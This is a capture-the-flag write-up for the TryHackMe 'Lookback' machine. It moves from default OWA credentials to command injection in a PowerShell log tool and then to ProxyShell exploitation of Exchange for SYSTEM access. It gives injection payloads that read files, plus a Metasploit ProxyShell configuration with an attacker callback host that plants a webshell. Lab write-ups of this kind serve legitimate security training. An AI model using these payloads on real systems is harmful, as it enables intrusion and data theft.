# TryHackMe - Lookback

## Overview

This machine was compromised by leveraging default credentials to gain initial access, exploiting a command injection vulnerability in a development tool to achieve remote code execution, and ultimately abusing an unpatched Microsoft Exchange server vulnerable to ProxyShell to obtain SYSTEM-level access.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV <TARGET_IP>
```

### Findings

* **Port 80** — IIS
* **Port 443** — IIS / Outlook Web Access (OWA)
* **Port 3389** — RDP

The SSL certificate revealed:

```bash
WIN-12OUO7A66M7.thm.local
thm.local
```

OWA error responses disclosed the Exchange version:

```bash
Microsoft Exchange 2019 CU8 (15.2.858.2)
```

This version is known to be vulnerable to ProxyShell.

---

## Web Enumeration

Directory enumeration identified multiple endpoints:

```bash
gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

### Findings

* `/test/`
* `/ecp/`
* Additional Exchange-related paths

---

## Initial Access — Default Credentials

Attempting authentication on OWA using:

```bash
admin:admin
```

returned a **UserHasNoMailboxException** instead of an invalid credentials error.

This confirmed:

* The account exists
* The credentials are valid

---

## Accessing Hidden Functionality

The `/test/` endpoint returned **403 Forbidden** over HTTP but was accessible over HTTPS with Basic Authentication:

```bash
curl -vk https://<TARGET_IP>/test/ -u admin:admin
```

This revealed:

* **Flag 1**
* A **Log Analyzer** tool
* A warning indicating it should not be exposed in production

---

## Command Injection — Remote Code Execution

The Log Analyzer tool passed user input directly into a PowerShell `Get-Content` command without sanitisation.

### Payload

```bash
BitlockerActiveMonitoringLogs') ; whoami #
```

### Result

```bash
thm\admin
```

This confirmed command execution as the `admin` user.

---


## Sensitive File Disclosure

Further exploitation was used to read internal files:

### Payload

```bash
BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\user.txt #
```

### Result

**Flag 1**

### Payload

```bash
BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\TODO.txt #
```
The file contained a critical email address:

```bash
dev-infrastracture-team@thm.local
```

---

## Reverse Shell

A PowerShell reverse shell was injected to gain an interactive session on the target system.

This provided a more stable environment for further exploitation.

---

## Privilege Escalation — ProxyShell (CVE-2021-34473)

The target was running a vulnerable version of Microsoft Exchange.

Using the discovered email address, ProxyShell was exploited via Metasploit:

```bash
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
set EMAIL dev-infrastracture-team@thm.local
set VHOST WIN-12OUO7A66M7.thm.local
set target 1
run
```

### Result

* Mailbox Import Export role assigned
* ASPX webshell deployed
* Meterpreter session obtained

---

## Root Access

The exploit resulted in a session as:

```bash
NT AUTHORITY\SYSTEM
```

### Flag Location

```bash
C:\Users\Administrator\Documents\
```
